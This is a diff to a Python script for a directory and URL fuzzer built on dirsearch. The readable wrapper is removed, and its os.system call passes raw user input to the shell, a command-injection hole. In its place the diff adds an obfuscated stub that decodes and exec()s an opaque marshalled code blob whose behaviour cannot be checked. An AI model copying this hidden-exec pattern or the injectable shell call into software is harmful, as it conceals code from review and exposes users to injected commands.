@@ -1,23 +1,3 @@
-# CREATED BY: RAMIZ UDDIN
-import os, time
-
-def tool_header(name):
-    os.system("clear")
-    print("\033[1;36m" + "="*45)
-    print(f"      {name.upper()}")
-    print("      CREATED BY: RAMIZ UDDIN")
-    print("="*45 + "\033[0m")
-
-# CREATED BY: RAMIZ UDDIN
-import cyber_deps
-cyber_deps.ensure_deps(system_pkgs=["dirsearch"])
-import os
-def run():
-    while True:
-        print("\033[1;32m[*] ", end=""); print("\n\033[1;34m[*] Directory & URL Fuzzer (Dirsearch)\033[0m")
-        target = input("\nEnter Target URL (or '0' to exit): ")
-        if target == '0': break
-        # Requires dirsearch (pkg install dirsearch)
-        os.system(f"dirsearch -u {target}")
-        input("\n[Press Enter to Continue]")
-if __name__ == "__main__": run()
+# ENCRYPTED BY: RAMIZ UDDIN ULTIMATE OBFUSCATOR
+# SOURCE PROTECTED. DO NOT TAMPER.
+import marshal,zlib,base64;exec(marshal.loads(zlib.decompress(base64.b64decode(b'eJyVUltPE0EUPtO9dLuVaxQVFEeiwuINBEyoggGKCcES07WJWsymtpNapdtmdpvIPhlfJPogxhj1QdNXjT+mwRrJ2jdNjG8If8DZWSiN9IWT7FzO2XPON+f7fkKDidv7lsmWN6CDjuaB+juiSA90Aw3wm0CFRSGuwB7rA124iHRxHOHdfInlSYuyLkduA6RY1qLUB2PbGRiyKIu04B/vspBGDcUk9gkens8cT7IeiAeadkZjaKdmUtrx64GmXiEB8eDeKjuoWmGkeZ7Y1CvterOgyQuulF4iKeqM9iSHr4xczk/sxxwZc3OO+/tMfHbq1mwUT9+J4PhUbO4uTkSjcwvO8L6q9iSH8proBgqWK1vLlk3yrlSkOdN2pVKxSKiGXNFM5YnlvQS74IbtQmHJeEBSGUJpGHx5WJNseQI1UX4293RuJVsVu2piqKKeqIqYHVaur46+jbyKvL66eqGinqyKfTyqVcVBfjj2TTy+5c3JDWVy1GIjSj9gjcM+IKP4KGulG+moK+AjV0AvJOv60JkedWE8gBt9jewIe9kxIQHbKmSeLCR3FA9xea8WmKKCif+VsFtV2fXGYgBaaMEJc7ov5ZOD9zBVWYi9TSBmxrmk8sgoj0RzlKTtAl3GZ3AifgNfLzkOoXggWp+Ix5VzSp01bea/laJZYvM/BwoU9w/1Y7uAyeOcrUWwi4aclvoo8fkSdrrV5E1KLAv76ezfmYJp58wSuaeJ1NO8K+XMYsmm3nSp7MOUbd7GZ59jdwVaMulBdmrziI9x4tfV1prSUmntLU+vKf1fDlUuPqxqj2odXZXDk187rq3I6+GOVf3FxLvTvxT1Zeh5aDVWPlM+UukcrCpneebZqnLubwuE2+gBr4liGPlUzjQMLcjxuKKdyxOuN1dNL98n1MiQouWGiWmVKOEXDsrL9PRqGJ+Al/JBK1fzhUxpiUzSHnb1XmNdYcuGgBD6DW2booR6t9oBda6D+h261qCrPF+eWIPhHxDaDATR+Y12EA+sOF+Fo+9HPoxVhKO8+D+qDA1I'))))
